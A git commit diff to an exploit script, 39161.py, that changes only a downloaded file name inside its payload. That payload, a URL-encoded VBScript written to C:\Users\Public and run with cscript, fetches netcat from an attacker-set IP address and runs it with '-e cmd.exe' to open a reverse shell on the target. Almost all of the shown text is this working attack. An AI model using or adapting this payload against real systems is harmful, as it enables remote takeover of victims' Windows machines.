c5e629c23c87e8402783c18b1e30e21441dd7780
darkniyt <47461159+darkniyt@users.noreply.github.com>
2020-11-22 23:12:58 -0500

    Update 39161.py

--- 39161.py
+++ 39161.py
@@ -31,7 +31,7 @@ try:
 
 	ip_addr = "10.6.26.44" #local IP address
 	local_port = "443" # Local Port number
-	vbs = "C:\Users\Public\script.vbs|dim%20xHttp%3A%20Set%20xHttp%20%3D%20createobject(%22Microsoft.XMLHTTP%22)%0D%0Adim%20bStrm%3A%20Set%20bStrm%20%3D%20createobject(%22Adodb.Stream%22)%0D%0AxHttp.Open%20%22GET%22%2C%20%22http%3A%2F%2F" + ip_addr + "%2Fnc64.exe%22%2C%20False%0D%0AxHttp.Send%0D%0A%0D%0Awith%20bStrm%0D%0A%20%20%20%20.type%20%3D%201%20%27%2F%2Fbinary%0D%0A%20%20%20%20.open%0D%0A%20%20%20%20.write%20xHttp.responseBody%0D%0A%20%20%20%20.savetofile%20%22C%3A%5CUsers%5CPublic%5Cnc.exe%22%2C%202%20%27%2F%2Foverwrite%0D%0Aend%20with%0D%0ASet%20objShell%20%3D%20CreateObject(%22WScript.Shell%22)%0D%0AobjShell.Exec(%22C%3A%5CUsers%5CPublic%5Cnc.exe%20-d%20" + ip_addr + "%20" +local_port+ "%20-e%20cmd.exe%22)"
+	vbs = "C:\Users\Public\script.vbs|dim%20xHttp%3A%20Set%20xHttp%20%3D%20createobject(%22Microsoft.XMLHTTP%22)%0D%0Adim%20bStrm%3A%20Set%20bStrm%20%3D%20createobject(%22Adodb.Stream%22)%0D%0AxHttp.Open%20%22GET%22%2C%20%22http%3A%2F%2F" + ip_addr + "%2Fnc.exe%22%2C%20False%0D%0AxHttp.Send%0D%0A%0D%0Awith%20bStrm%0D%0A%20%20%20%20.type%20%3D%201%20%27%2F%2Fbinary%0D%0A%20%20%20%20.open%0D%0A%20%20%20%20.write%20xHttp.responseBody%0D%0A%20%20%20%20.savetofile%20%22C%3A%5CUsers%5CPublic%5Cnc.exe%22%2C%202%20%27%2F%2Foverwrite%0D%0Aend%20with%0D%0ASet%20objShell%20%3D%20CreateObject(%22WScript.Shell%22)%0D%0AobjShell.Exec(%22C%3A%5CUsers%5CPublic%5Cnc.exe%20-d%20" + ip_addr + "%20" +local_port+ "%20-e%20cmd.exe%22)"
 	save= "save|" + vbs
 	vbs2 = "cscript.exe%20C%3A%5CUsers%5CPublic%5Cscript.vbs"
 	exe= "exec|"+vbs2
